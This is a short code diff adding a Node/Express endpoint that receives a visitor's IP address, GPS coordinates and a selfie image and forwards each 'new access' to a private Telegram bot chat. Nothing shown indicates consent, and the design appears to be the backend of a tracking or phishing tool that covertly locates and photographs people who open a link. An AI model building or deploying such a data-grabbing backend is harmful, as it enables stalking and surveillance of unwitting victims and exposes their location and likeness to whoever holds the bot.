@@ -1,0 +1,26 @@
+app.post('/api/send', async (req, res) => {
+  try {
+    const { ip, latitude, longitude, selfie } = req.body;
+
+    const message = `📡 Novo acesso!\nIP: ${ip}\n📍 Latitude: ${latitude}\n📍 Longitude: ${longitude}`;
+    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: message,
+    });
+
+    if (selfie) {
+      await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+        chat_id: CHAT_ID,
+        photo: selfie,
+      });
+    }
+
+    res.sendStatus(200);
+  } catch (err) {
+    console.error('Erro ao enviar para Telegram:', err);
+    res.status(500).send('Falha no envio');
+  }
+});
